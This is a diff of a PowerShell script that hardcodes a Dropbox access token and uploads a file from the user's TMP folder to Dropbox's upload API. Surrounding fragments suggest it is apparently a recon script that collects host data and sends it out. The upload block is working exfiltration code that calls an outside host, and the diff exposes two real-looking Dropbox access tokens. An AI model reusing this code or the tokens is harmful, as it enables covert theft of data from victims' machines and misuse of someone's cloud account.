@@ -33,7 +33,8 @@
 
 ############################################################################################################################################################
 
-#$DropBoxAccessToken = "sl.BV3xvp3EYGBSbf1FuACOjWhQ0H7ZwaasEApA0-kKwTYjAjWL6KTe8avYSejuQd8MRM9V3AMVxuFvNQIuQCecfs0ptmGKYzMptglCoTKeTA6ZV1C7U0FQ4629JPuX8rk4-63NrSue"
+$DropBoxAccessToken = "sl.BV0jdGOJSljRkWzLqDgcXb3f8HF2JV8yxvKetMMVsDA2bK3A7Lv_39WI9ROM8w2aQJoKqVpDzrfTxBaJVB3DKXIPfjGaeSXN_phaAo194kKbRWVg1CGeKHwSd6njdgiCT7v04oSH"
+
 ############################################################################################################################################################
 
  function Get-fullName {
@@ -370,14 +371,12 @@ vault -ErrorAction SilentlyContinue -Force
 $TargetFilePath="/$FileName"
 $SourceFilePath="$env:TMP\$FileName"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$DropBoxAccessToken = "sl.BV3xvp3EYGBSbf1FuACOjWhQ0H7ZwaasEApA0-kKwTYjAjWL6KTe8avYSejuQd8MRM9V3AMVxuFvNQIuQCecfs0ptmGKYzMptglCoTKeTA6ZV1C7U0FQ4629JPuX8rk4-63NrSue"   # Replace with your DropBox Access Token
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
 $authorization = "Bearer " + $DropBoxAccessToken
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers -usebasicparsing
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 
 ############################################################################################################################################################
 
